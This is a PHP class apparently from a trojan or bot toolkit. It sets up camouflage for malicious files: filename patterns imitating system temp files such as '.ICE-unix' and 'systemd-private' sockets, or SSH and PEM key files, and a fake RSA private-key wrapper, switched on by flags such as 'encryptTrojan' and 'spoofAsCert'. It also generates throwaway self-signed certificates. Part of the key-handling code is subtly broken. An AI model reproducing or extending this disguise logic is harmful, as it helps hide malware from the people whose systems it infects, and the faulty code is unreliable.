<?php

namespace new_bots\slop_full;

use Faker\Factory;
use Faker\Generator;

class slopFull
{
    protected bool $useCert;
    private array $niceSafeStrings;
    private array $certSpoofer;
    private array $certNameCandidates;
    protected string $key;
    private bool $encryptTrojan;
    private string $sloppyHome;


    function __construct(string | null $key, bool $use509, bool $spoofAsCert, bool $encryptTrojan, string $sloppyHome)
    {
        if (is_null($key) and $encryptTrojan === true){
            throw new \InvalidArgumentException("Key cannot be null");
        }
        $this->sloppyHome = $sloppyHome;
        $this->key = $key;
        $this->encryptTrojan = $encryptTrojan;
        $this->useCert = $use509;
        if ($spoofAsCert) {
            $this->certNameCandidates = [
                "single" => [
                    "%s_key.pem",
                    "%s_key.crt",
                    "%s_key.der",
                    "%s_key.pgp",
                    "%s_key.cert",
                    "%s_key.lsa",
                ],
                "quad" => [
                    "%s%s%s_%s",
                    "id_%s-%s.rsa",
                ],
                "double" => [
                    "id_%s-%s.ed25519"
                ]
            ];
            $this->certSpoofer = [
                "-----BEGIN RSA PRIVATE KEY-----",
                "%s",
                "-----END RSA PRIVATE KEY-----"
            ];
        }
        $this->niceSafeStrings = [
            "single" => [
                ".ICE-unix-%s",
                ".font-unix-%s",
                ".java_pid%s",
                "ssh-XXXXXX%s",
            ],
            "trio" => [
                "systemd-private-%s-%s.service-%s",
            ],
            "fiver" => [
                "Temp-%s-%s-%s-%s-%s"
            ]
        ];
    }

    protected function generateCrypto(): array
    {
        $fakeTheLandings = Factory::create();
        $privateKey = openssl_pkey_new([
            "private_key_bits" => 521,
            "private_key_type" => OPENSSL_KEYTYPE_EC
        ]);
        $publicKey = openssl_pkey_get_details($privateKey);
        $publicKey = $privateKey["Key"];
        $config = [
            "digest_alg" => "sha512",
            "x509_extensions" => "v3_ca",
            "req_extensions" => "v3_req",
            "private_key_bits" => 521,
            "private_key_type" => OPENSSL_KEYTYPE_EC,
            "encrypt_key" => false
        ];
        $dn = [
            "countryName" => $fakeTheLandings->country(),
            "stateOrProvinceName" => $fakeTheLandings->state,
            "localityName" => $fakeTheLandings->city,
            "organizationName" => $fakeTheLandings->word(),
            "organizationUnitName" => $fakeTheLandings->word(),
            "commonName" => $fakeTheLandings->word()
        ];
        $csr = openssl_csr_new($dn, $privateKey, $config);
        $cert = openssl_csr_sign($csr, null, $privateKey, 365, $config);
        if (!is_dir("{$this->sloppyHome}/certs/")){
            mkdir("{$this->sloppyHome}/certs/");
            mkdir("{$this->sloppyHome}/certs/pem");
            mkdir("{$this->sloppyHome}/certs/csr");
            mkdir("{$this->sloppyHome}/certs/private");
        }
        $pemFile = sprintf("%s/certs/private/%s", $this->sloppyHome, bin2hex(openssl_random_pseudo_bytes(10)));
        $pkeyFile =  sprintf("%s/certs/pem/%s", $this->sloppyHome, bin2hex(openssl_random_pseudo_bytes(10)));
        openssl_x509_export_to_file($cert, $pemFile);
        openssl_pkey_export_to_file($privateKey, $pkeyFile);
        return [
          "pkey" => $pkeyFile,
          "pemFile" => $pemFile,
          "cert" => $cert,
          "privateKey" => $privateKey
        ];

    }

}